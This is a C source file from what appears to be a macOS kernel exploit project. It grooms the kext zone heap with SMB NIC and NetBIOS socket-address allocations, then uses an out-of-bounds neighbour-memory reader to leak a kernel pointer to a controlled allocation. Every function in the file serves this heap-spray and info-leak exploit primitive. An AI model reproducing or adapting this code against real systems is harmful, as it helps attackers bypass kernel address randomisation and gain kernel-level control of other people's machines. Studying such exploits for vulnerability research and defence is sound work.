//
//  zalloc_kext_small.c
//  kmem_xepg
//
//  Created by admin on 12/27/21.
//

#include <stdlib.h>
#include <string.h>

#include <dispatch/dispatch.h>
#include <sys/proc_info.h>
#include <sys/errno.h>

#include <xe/util/misc.h>
#include <xe/util/log.h>
#include <xe/util/assert.h>

#include "../smb/nic_allocator.h"
#include "../smb/ssn_allocator.h"
#include "../external/smbfs/netbios.h"

#include "zkext_alloc_small.h"
#include "kmem_neighbor_reader.h"
#include "allocator_rw.h"
#include "allocator_prpw.h"

#include "platform_params.h"


#define NUM_PAD_ELEMENTS (XE_PAGE_SIZE / 32)
#define NUM_GAP_ELEMENTS (XE_PAGE_SIZE / 32 * 2)

#define MAX_TRIES 5
#define MAX_SESSIONS 5

const int zone_kext_sizes[] = {
    16, 32, 48, 64, 80, 96, 128, 160, 192, 224, 256
};


int kmem_zkext_alloc_small_scan_nb_name(char* name, size_t len, uint16_t z_elem_size, uintptr_t* out) {
    int skip_bytes = 32 - offsetof(struct sockaddr_nb, snb_name);
    int read_bytes = sizeof(uintptr_t) * 3;
    if (len < skip_bytes + read_bytes) {
        return ENOENT;
    }
    
    uintptr_t ptr;
    memcpy(&ptr, name + skip_bytes, sizeof(ptr));
    
    if (XE_VM_KERNEL_ADDRESS_VALID(ptr) && ptr % z_elem_size == 0) {
        *out = ptr;
        return 0;
    }
    
    return ENOENT;
}


int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, kmem_neighbor_reader_t reader, char* data, size_t data_size, struct kmem_zkext_alloc_small_entry* out) {
    size_t alloc_size = data_size + 8;
    xe_assert(alloc_size < 256);
    
    int zone_size = -1;
    for (int i = 0; i < XE_ARRAY_SIZE(zone_kext_sizes); i++) {
        if (zone_kext_sizes[i] >= alloc_size) {
            zone_size = zone_kext_sizes[i];
            break;
        }
    }
    xe_assert(zone_size > 0);
        
    smb_nic_allocator pad_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    smb_nic_allocator gap_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    kmem_allocator_prpw_t element_allocator = kmem_allocator_prpw_create(smb_addr, NUM_GAP_ELEMENTS);

    for (int gap_idx = 0; gap_idx < NUM_GAP_ELEMENTS; gap_idx++) {
        struct network_nic_info gap_info;
        bzero(&gap_info, sizeof(gap_info));
        gap_info.nic_index = 0;
        gap_info.addr_4.sin_family = AF_INET;
        gap_info.addr_4.sin_len = sizeof(struct sockaddr_in);
        gap_info.addr_4.sin_addr.s_addr = gap_idx;
        
        int error = kmem_allocator_prpw_allocate(element_allocator, 1, ^(void* ctx, uint8_t* len, sa_family_t* family, char** data_out, size_t* data_out_size, size_t index) {
            *len = data_size + 8;
            *family = AF_INET;
            *data_out = data;
            *data_out_size = data_size;
        }, NULL);
        xe_assert_err(error);
        
        error = smb_nic_allocator_allocate(gap_allocator, &gap_info, 1, sizeof(gap_info));
        xe_assert_err(error);
    }
    
    int error = smb_nic_allocator_destroy(&gap_allocator);
    xe_assert_err(error);
    
    uint32_t pad_infos_size = sizeof(struct network_nic_info) * NUM_PAD_ELEMENTS / 2;
    struct network_nic_info* pad_infos = malloc(pad_infos_size);
    bzero(pad_infos, pad_infos_size);
    for (int i = 0; i < NUM_PAD_ELEMENTS / 2; i++) {
        struct network_nic_info* info = &pad_infos[i];
        info->nic_index = 0;
        info->addr_4.sin_family = AF_INET;
        info->addr_4.sin_len = 32;
        info->addr_4.sin_addr.s_addr = i;
    }
    error = smb_nic_allocator_allocate(pad_allocator, pad_infos, NUM_PAD_ELEMENTS / 2, pad_infos_size);
    xe_assert_err(error);
    free(pad_infos);
    
    uintptr_t value = 0;
    for (int try = 0; try < MAX_TRIES; try++) {
        xe_log_debug("alloc session try %d / %d", try, MAX_TRIES);
        
        uint8_t nb_len = 32 + sizeof(uintptr_t) * 3;
        uint32_t ioc_len = 32;
        uint8_t snb_name = 36;
        
        char data[sizeof(uint32_t) * 2 + (snb_name + 2) * 2];
        kmem_neighbor_reader_read(reader, nb_len, ioc_len, snb_name, nb_len, ioc_len, snb_name, data, (uint32_t)sizeof(data));
        
        uint32_t saddr_len = *((uint32_t*)data);
        xe_assert_cond(saddr_len, ==, snb_name + 2);
        if (!kmem_zkext_alloc_small_scan_nb_name(&data[4], ioc_len + 2, zone_size, &value)) {
            break;
        }
        
        uint32_t paddr_len = *((uint32_t*)&data[saddr_len + 4]);
        xe_assert_cond(paddr_len, ==, snb_name + 2);
        if (!kmem_zkext_alloc_small_scan_nb_name(&data[saddr_len + 4 + 4], snb_name + 2, zone_size, &value)) {
            break;
        }
    }
    
    smb_nic_allocator_destroy(&pad_allocator);
    
    if (value) {
        out->address = value;
        out->element_allocator = element_allocator;
        return 0;
    } else {
        kmem_allocator_prpw_destroy(&element_allocator);
        return EAGAIN;
    }
}


struct kmem_zkext_alloc_small_entry kmem_zkext_alloc_small(const struct sockaddr_in* smb_addr, kmem_neighbor_reader_t reader, char* data, size_t data_size) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        xe_log_debug("alloc session %d / %d", i, MAX_SESSIONS);
        struct kmem_zkext_alloc_small_entry entry;
        int error = kmem_zkext_alloc_small_try(smb_addr, reader, data, data_size, &entry);
        if (!error) {
            return entry;
        }
    }
    xe_log_error("alloc failed");
    abort();
}
